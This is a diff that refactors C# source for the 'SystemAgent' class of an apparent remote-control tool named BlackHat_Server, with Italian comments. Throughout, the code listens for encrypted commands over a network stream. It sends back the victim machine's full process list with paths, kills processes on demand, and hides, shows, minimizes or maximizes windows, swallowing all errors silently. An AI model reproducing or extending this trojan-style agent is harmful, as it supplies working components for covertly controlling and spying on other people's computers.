@@ -1,19 +1,16 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
+﻿using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading;
 
 namespace BlackHat_Server
 {
-    class SystemAgent
+    internal class SystemAgent
     {
-        NetworkStream systemStream;
-        MsgManager mm;
+        private readonly MsgManager mm;
 
-        bool stopSystemListener = false;
+        private bool stopSystemListener;
+        private readonly NetworkStream systemStream;
 
         public SystemAgent(NetworkStream clientStream)
         {
@@ -22,35 +19,34 @@ namespace BlackHat_Server
         }
 
         /// <summary>
-        /// Avvia thread di ascolto per System Info
+        ///     Avvia thread di ascolto per System Info
         /// </summary>
         public void StartSystemListener()
         {
-            Thread t = new Thread(SystemListener);
-            t.IsBackground = true;            
+            var t = new Thread(SystemListener);
+            t.IsBackground = true;
             t.Start();
         }
 
 
         /// <summary>
-        /// Listener System Info
+        ///     Listener System Info
         /// </summary>
         private void SystemListener()
         {
             while (ST_Client.Instance.isConnected && !stopSystemListener)
-            {
                 try
                 {
-                    System.Threading.Thread.Sleep(10);
+                    Thread.Sleep(10);
 
-                    string cmd = mm.WaitForEncryMessageRicorsive(10000);
+                    var cmd = mm.WaitForEncryMessageRicorsive(10000);
 
                     if (stopSystemListener)
                         break;
 
                     if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                     {
-                        string[] cmdSplit = cmd.Split('|');
+                        var cmdSplit = cmd.Split('|');
 
                         switch (cmdSplit[0])
                         {
@@ -93,20 +89,12 @@ namespace BlackHat_Server
                                 // RICHIESTA Show FINESTRA CON HANDLE PASSATO IN CMDPAR1
                                 ShowWindow(cmdSplit[1]);
                                 break;
-
-                            default:
-                                break;
                         }
-
-
-
                     }
                 }
-                catch 
-                {                    
+                catch
+                {
                 }
-
-            }
 
             // ARRIVO QUI PERCHè IL LISTENER è MORTO
 
@@ -120,31 +108,29 @@ namespace BlackHat_Server
             }
             catch
             {
-
             }
-                
         }
 
 
         /// <summary>
-        ///  Invia i Processi
-        ///  La * divide i processi
-        ///  La | divide le proprietà dei processi
+        ///     Invia i Processi
+        ///     La * divide i processi
+        ///     La | divide le proprietà dei processi
         /// </summary>
         private void SendProcesses()
         {
             try
             {
-                Process[] activeProcess = Process.GetProcesses();
+                var activeProcess = Process.GetProcesses();
 
-                string processListMessage = "";
+                var processListMessage = "";
 
-                foreach (Process process in activeProcess)
+                foreach (var process in activeProcess)
                 {
                     // NOME DEL PROCESSO
-                    string procName = "";
-                    string procDescription = "";
-                    string procLocation = "";
+                    var procName = "";
+                    var procDescription = "";
+                    var procLocation = "";
 
                     try
                     {
@@ -155,9 +141,8 @@ namespace BlackHat_Server
                             procName = Path.GetFileName(procLocation);
                             procDescription = process.Modules[0].FileVersionInfo.FileDescription;
                         }
-
                     }
-                    catch 
+                    catch
                     {
                         procName = process.ProcessName;
                         procLocation = "";
@@ -165,182 +150,167 @@ namespace BlackHat_Server
                     }
                     //----------------------                    
 
-                    
-                    string procID = process.Id.ToString();
-                    string procThradsNumb = process.Threads.Count.ToString();
 
-                    string procListEntry = string.Format("{0}|{1}|{2}|{3}|{4}", procName, procID,procThradsNumb,procLocation,procDescription);
+                    var procID = process.Id.ToString();
+                    var procThradsNumb = process.Threads.Count.ToString();
+
+                    var procListEntry = string.Format("{0}|{1}|{2}|{3}|{4}", procName, procID, procThradsNumb,
+                        procLocation, procDescription);
                     processListMessage += procListEntry + "*";
                 }
 
                 processListMessage = processListMessage.TrimEnd('*');
 
-                mm.SendLargeEncryMessage(processListMessage, 10000);                
-
+                mm.SendLargeEncryMessage(processListMessage, 10000);
             }
-            catch 
-            {                
-               
+            catch
+            {
             }
-           
         }
         //--------------------------------
 
 
         /// <summary>
-        /// Termina il processo indicato dall'ID
+        ///     Termina il processo indicato dall'ID
         /// </summary>
         /// <param name="procID"></param>
         private void KillProcess(string procID)
         {
             try
             {
-                int iID = int.Parse(procID);
+                var iID = int.Parse(procID);
 
-                Process p = Process.GetProcessById(iID);
+                var p = Process.GetProcessById(iID);
 
-                if (p != null)                
+                if (p != null)
                     p.Kill();
 
-                mm.SendEncryMessage("KILLED!",5000);
-                
+                mm.SendEncryMessage("KILLED!", 5000);
             }
-            catch 
+            catch
             {
                 mm.SendEncryMessage("NOT_KILLED!", 5000);
             }
-           
-
         }
         //--------------------------------
 
         /// <summary>
-        /// Invia le finestre
+        ///     Invia le finestre
         /// </summary>
         private void SendWindows()
         {
             try
             {
-                WindowsManager wm = new WindowsManager();
-                string winList = wm.GetWindows();
+                var wm = new WindowsManager();
+                var winList = wm.GetWindows();
 
                 if (winList != null)
-                    mm.SendLargeEncryMessage(winList,10000);
+                    mm.SendLargeEncryMessage(winList, 10000);
             }
-            catch 
-            {              
-                
+            catch
+            {
             }
         }
 
 
         /// <summary>
-        /// Minimize una finestra
-        /// Risponde l'esito dell'operazione
+        ///     Minimize una finestra
+        ///     Risponde l'esito dell'operazione
         /// </summary>
         /// <param name="sHandle"></param>
         private void MinimizeWindow(string sHandle)
         {
             try
             {
-                int iHandle = int.Parse(sHandle);
-                WindowsManager wm = new WindowsManager();
+                var iHandle = int.Parse(sHandle);
+                var wm = new WindowsManager();
 
-                int minimize = wm.MinimizeWindow(iHandle);
+                var minimize = wm.MinimizeWindow(iHandle);
 
                 if (minimize > 0)
-                    mm.SendEncryMessage("MINIZED",5000);
+                    mm.SendEncryMessage("MINIZED", 5000);
                 else
-                    mm.SendEncryMessage("NOT_MINIMIZED",5000);
-
+                    mm.SendEncryMessage("NOT_MINIMIZED", 5000);
             }
-            catch 
+            catch
             {
                 mm.SendEncryMessage("NOT_CLOSED", 5000);
             }
-            
         }
 
         /// <summary>
-        /// Massimizza una finestra
-        /// Risponde l'esito dell'operazione
+        ///     Massimizza una finestra
+        ///     Risponde l'esito dell'operazione
         /// </summary>
         /// <param name="sHandle"></param>
         private void MaximizeWindow(string sHandle)
         {
             try
             {
-                int iHandle = int.Parse(sHandle);
-                WindowsManager wm = new WindowsManager();
+                var iHandle = int.Parse(sHandle);
+                var wm = new WindowsManager();
 
-                int minimize = wm.MaximizeWindow(iHandle);
+                var minimize = wm.MaximizeWindow(iHandle);
 
                 if (minimize > 0)
                     mm.SendEncryMessage("OK", 5000);
                 else
                     mm.SendEncryMessage("NOT", 5000);
-
             }
             catch
             {
                 mm.SendEncryMessage("ERROR", 5000);
             }
-
         }
 
         /// <summary>
-        /// hIDE una finestra
-        /// Risponde l'esito dell'operazione
+        ///     hIDE una finestra
+        ///     Risponde l'esito dell'operazione
         /// </summary>
         /// <param name="sHandle"></param>
         private void HideWindow(string sHandle)
         {
             try
             {
-                int iHandle = int.Parse(sHandle);
-                WindowsManager wm = new WindowsManager();
+                var iHandle = int.Parse(sHandle);
+                var wm = new WindowsManager();
 
-                int h = wm.HideWindow(iHandle);
+                var h = wm.HideWindow(iHandle);
 
                 if (h > 0)
                     mm.SendEncryMessage("OK", 5000);
                 else
                     mm.SendEncryMessage("NOT", 5000);
-
             }
             catch
             {
                 mm.SendEncryMessage("ERROR", 5000);
             }
-
         }
 
         /// <summary>
-        /// Show una finestra
-        /// Risponde l'esito dell'operazione
+        ///     Show una finestra
+        ///     Risponde l'esito dell'operazione
         /// </summary>
         /// <param name="sHandle"></param>
         private void ShowWindow(string sHandle)
         {
             try
             {
-                int iHandle = int.Parse(sHandle);
-                WindowsManager wm = new WindowsManager();
+                var iHandle = int.Parse(sHandle);
+                var wm = new WindowsManager();
 
-                int h = wm.ShowWindow(iHandle);
+                var h = wm.ShowWindow(iHandle);
 
                 if (h > 0)
                     mm.SendEncryMessage("OK", 5000);
                 else
                     mm.SendEncryMessage("NOT", 5000);
-
             }
             catch
             {
                 mm.SendEncryMessage("ERROR", 5000);
             }
-
         }
-
     }
 }
